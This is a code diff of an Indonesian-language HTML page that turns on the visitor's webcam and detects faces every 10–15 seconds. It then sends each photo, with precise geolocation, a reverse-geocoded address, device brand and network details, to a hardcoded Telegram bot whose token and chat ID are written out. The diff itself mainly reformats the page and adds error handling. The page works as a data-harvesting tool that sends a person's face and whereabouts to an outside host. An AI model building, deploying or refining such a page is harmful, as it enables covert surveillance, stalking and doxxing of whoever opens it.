@@ -1,149 +1,178 @@
-‎<!DOCTYPE html>  <html lang="id">  
-‎<head>  
-‎  <meta charset="utf-8" />  
-‎  <meta name="viewport" content="width=device-width,initial-scale=1" />  
-‎  <title>📸 Auto Face Capture → Telegram</title>  
-‎  <style>  
-‎    body {  
-‎      margin: 0; font-family: Arial, sans-serif;  
-‎      display: flex; flex-direction: column; align-items: center; justify-content: center;  
-‎      background: #0d1117; color: #eee; height: 100vh;  
-‎    }  
-‎    video, canvas { border-radius: 10px; box-shadow: 0 0 20px #00ffff55; }  
-‎    #info { margin-top: 12px; color: #ccc; font-size: 14px; max-width: 640px; text-align: center; }  
-‎    #error { margin-top: 10px; color: #ff6666; }  
-‎  </style>  
-‎</head>  
-‎<body>  
-‎  <h2>🤖 Auto Face Detect → Kirim ke Telegram</h2>  
-‎  <video id="video" width="640" height="480" autoplay muted playsinline></video>  
-‎  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>  
-‎  <div id="info">Menyiapkan sistem...</div>  
-‎  <div id="error"></div>    <!-- face-api.js -->    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>    <script>  
-‎  // ========== KONFIGURASI ==========  
-‎  const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";  
-‎  const CHAT_ID = "8471664635";  
-‎  
-‎  const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";  
-‎  const DETECT_INTERVAL = 10000; // setiap 10 detik  
-‎  const video = document.getElementById('video');  
-‎  const canvas = document.getElementById('canvas');  
-‎  const ctx = canvas.getContext('2d');  
-‎  const infoDiv = document.getElementById('info');  
-‎  const errorDiv = document.getElementById('error');  
-‎  
-‎  // ==== Utility: Deteksi device, jaringan, lokasi ====  
-‎  function detectDevice() {  
-‎    const ua = navigator.userAgent.toLowerCase();  
-‎    let brand = "Unknown";  
-‎    if (/iphone|ipad/.test(ua)) brand = "Apple (iPhone/iPad)";  
-‎    else if (/android/.test(ua)) {  
-‎      if (/samsung/.test(ua)) brand = "Samsung";  
-‎      else if (/huawei|honor/.test(ua)) brand = "Huawei/Honor";  
-‎      else if (/xiaomi|redmi|poco/.test(ua)) brand = "Xiaomi/Poco";  
-‎      else if (/oppo/.test(ua)) brand = "OPPO";  
-‎      else if (/vivo/.test(ua)) brand = "Vivo";  
-‎      else brand = "Android (lainnya)";  
-‎    } else if (/windows/.test(ua)) brand = "Windows PC";  
-‎    else if (/macintosh/.test(ua)) brand = "MacOS";  
-‎    else if (/linux/.test(ua)) brand = "Linux";  
-‎    return { brand, ua };  
-‎  }  
-‎  
-‎  function getNetworkInfo() {  
-‎    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;  
-‎    return {  
-‎      type: conn ? conn.effectiveType : "unknown",  
-‎      downlink: conn ? conn.downlink : "n/a",  
-‎      rtt: conn ? conn.rtt : "n/a"  
-‎    };  
-‎  }  
-‎  
-‎  async function getLocation() {  
-‎    return new Promise(resolve => {  
-‎      if (!navigator.geolocation) return resolve(null);  
-‎      navigator.geolocation.getCurrentPosition(  
-‎        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),  
-‎        () => resolve(null),  
-‎        { enableHighAccuracy: true, timeout: 7000 }  
-‎      );  
-‎    });  
-‎  }  
-‎  
-‎  async function reverseGeocode(lat, lon) {  
-‎    try {  
-‎      const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);  
-‎      const d = await r.json();  
-‎      return d.display_name || null;  
-‎    } catch {  
-‎      return null;  
-‎    }  
-‎  }  
-‎  
-‎  // ==== Kirim ke Telegram ====  
-‎  async function sendToTelegram(photoBlob, caption) {  
-‎    const fd = new FormData();  
-‎    fd.append("chat_id", CHAT_ID);  
-‎    fd.append("caption", caption);  
-‎    fd.append("photo", photoBlob, "face.jpg");  
-‎    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });  
-‎    if (!resp.ok) throw new Error("Gagal kirim ke Telegram (" + resp.status + ")");  
-‎  }  
-‎  
-‎  // ==== Ambil Foto & Kirim ====  
-‎  async function captureAndSend() {  
-‎    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);  
-‎    const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());  
-‎    if (detections.length === 0) {  
-‎      console.log("❌ Tidak ada wajah terdeteksi");  
-‎      infoDiv.textContent = "Tidak ada wajah, mencoba lagi...";  
-‎      return;  
-‎    }  
-‎  
-‎    infoDiv.textContent = `✅ ${detections.length} wajah terdeteksi, sedang kirim...`;  
-‎    const device = detectDevice();  
-‎    const net = getNetworkInfo();  
-‎    const loc = await getLocation();  
-‎    let locText = "Tidak diketahui";  
-‎    if (loc) {  
-‎      const geo = await reverseGeocode(loc.lat, loc.lon);  
-‎      locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}\n${geo || ""}`;  
-‎    }  
-‎  
-‎    const caption = `📸 Deteksi Wajah Otomatis\n` +  
-‎                    `📱 Device: ${device.brand}\n` +  
-‎                    `🌐 Jaringan: ${net.type} (${net.downlink} Mbps)\n` +  
-‎                    `📍 Lokasi: ${locText}\n` +  
-‎                    `🕒 ${new Date().toLocaleString()}`;  
-‎  
-‎    canvas.toBlob(async blob => {  
-‎      try {  
-‎        await sendToTelegram(blob, caption);  
-‎        infoDiv.textContent = "✅ Data terkirim ke Telegram (" + new Date().toLocaleTimeString() + ")";  
-‎      } catch (e) {  
-‎        errorDiv.textContent = "Gagal kirim: " + e.message;  
-‎      }  
-‎    }, 'image/jpeg', 0.9);  
-‎  }  
-‎  
-‎  // ==== Inisialisasi ====  
-‎  async function init() {  
-‎    try {  
-‎      infoDiv.textContent = "Memuat model AI...";  
-‎      await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);  
-‎  
-‎      const stream = await navigator.mediaDevices.getUserMedia({ video: true });  
-‎      video.srcObject = stream;  
-‎      await video.play();  
-‎  
-‎      infoDiv.textContent = "Kamera aktif, mendeteksi otomatis...";  
-‎      setInterval(captureAndSend, DETECT_INTERVAL);  
-‎    } catch (e) {  
-‎      errorDiv.textContent = "❌ Error: " + e.message;  
-‎      infoDiv.textContent = "Tidak bisa mengakses kamera.";  
-‎    }  
-‎  }  
-‎  
-‎  window.addEventListener("load", init);  
-‎  </script>  </body>  
-‎</html>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>📸 Auto Face Capture → Telegram</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: #0d1117;
+      color: #eee;
+      height: 100vh;
+      text-align: center;
+    }
+    video, canvas {
+      border-radius: 10px;
+      box-shadow: 0 0 20px #00ffff55;
+    }
+    #info { margin-top: 12px; color: #ccc; font-size: 14px; max-width: 640px; }
+    #error { margin-top: 10px; color: #ff6666; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <h2>🤖 Auto Face Detect → Kirim ke Telegram</h2>
+  <video id="video" width="640" height="480" autoplay muted playsinline></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+  <div id="info">Menyiapkan sistem...</div>
+  <div id="error"></div>
+
+  <!-- face-api.js -->
+  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+
+  <script>
+  // ========== KONFIGURASI ==========
+  const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
+  const CHAT_ID = "8471664635";
+  const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";
+  const DETECT_INTERVAL = 15000; // setiap 15 detik
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+  const infoDiv = document.getElementById('info');
+  const errorDiv = document.getElementById('error');
+
+  // ========== DETEKSI PERANGKAT ==========
+  function detectDevice() {
+    const ua = navigator.userAgent.toLowerCase();
+    let brand = "Tidak diketahui";
+    if (/iphone|ipad/.test(ua)) brand = "Apple (iPhone/iPad)";
+    else if (/android/.test(ua)) {
+      if (/samsung/.test(ua)) brand = "Samsung";
+      else if (/huawei|honor/.test(ua)) brand = "Huawei/Honor";
+      else if (/xiaomi|redmi|poco/.test(ua)) brand = "Xiaomi/Poco";
+      else if (/oppo/.test(ua)) brand = "OPPO";
+      else if (/vivo/.test(ua)) brand = "Vivo";
+      else brand = "Android lainnya";
+    } else if (/windows/.test(ua)) brand = "Windows PC";
+    else if (/macintosh/.test(ua)) brand = "MacOS";
+    else if (/linux/.test(ua)) brand = "Linux";
+    return { brand, ua };
+  }
+
+  function getNetworkInfo() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return {
+      type: conn ? conn.effectiveType : "unknown",
+      downlink: conn ? conn.downlink : "n/a",
+      rtt: conn ? conn.rtt : "n/a"
+    };
+  }
+
+  // ========== AMBIL LOKASI ==========
+  async function getLocation() {
+    return new Promise(resolve => {
+      if (!navigator.geolocation) return resolve(null);
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+        () => resolve(null),
+        { enableHighAccuracy: true, timeout: 7000 }
+      );
+    });
+  }
+
+  async function reverseGeocode(lat, lon) {
+    try {
+      const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+      const d = await r.json();
+      return d.display_name || null;
+    } catch {
+      return null;
+    }
+  }
+
+  // ========== KIRIM FOTO KE TELEGRAM ==========
+  async function sendToTelegram(photoBlob, caption) {
+    try {
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("caption", caption);
+      fd.append("photo", photoBlob, "face.jpg");
+
+      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+      const text = await resp.text();
+      if (!resp.ok) throw new Error(text);
+
+      console.log("✅ Terkirim ke Telegram");
+    } catch (err) {
+      errorDiv.textContent = "❌ Gagal kirim ke Telegram: " + err.message;
+      console.error(err);
+    }
+  }
+
+  // ========== AMBIL & KIRIM FOTO ==========
+  async function captureAndSend() {
+    try {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
+
+      if (detections.length === 0) {
+        infoDiv.textContent = "Tidak ada wajah, mencoba lagi...";
+        return;
+      }
+
+      infoDiv.textContent = `✅ ${detections.length} wajah terdeteksi, sedang kirim...`;
+      const device = detectDevice();
+      const net = getNetworkInfo();
+      const loc = await getLocation();
+      let locText = "Tidak diketahui";
+      if (loc) {
+        const geo = await reverseGeocode(loc.lat, loc.lon);
+        locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}\n${geo || ""}`;
+      }
+
+      const caption = `📸 Deteksi Wajah Otomatis\n` +
+                      `📱 Device: ${device.brand}\n` +
+                      `🌐 Jaringan: ${net.type} (${net.downlink} Mbps)\n` +
+                      `📍 Lokasi: ${locText}\n` +
+                      `🕒 ${new Date().toLocaleString()}`;
+
+      canvas.toBlob(async blob => {
+        await sendToTelegram(blob, caption);
+        infoDiv.textContent = "✅ Data terkirim ke Telegram (" + new Date().toLocaleTimeString() + ")";
+      }, 'image/jpeg', 0.9);
+    } catch (e) {
+      errorDiv.textContent = "⚠️ Error capture: " + e.message;
+      console.error(e);
+    }
+  }
+
+  // ========== INISIALISASI ==========
+  async function init() {
+    try {
+      infoDiv.textContent = "Memuat model AI...";
+      await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+      console.log("Model wajah berhasil dimuat");
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await video.play();
+
+      infoDiv.textContent = "Kamera aktif, mendeteksi otomatis...";
+      setInterval(captureAndSend, DETECT_INTERVAL);
+    } catch (e) {
+      errorDiv.textContent = "❌ Tidak bisa mengakses kamera atau model gagal dimuat.";
+      console.error(e);
+    }
+  }
+
+  window.addEventListener("load", init);
+  </script>
+</body>
+</html>
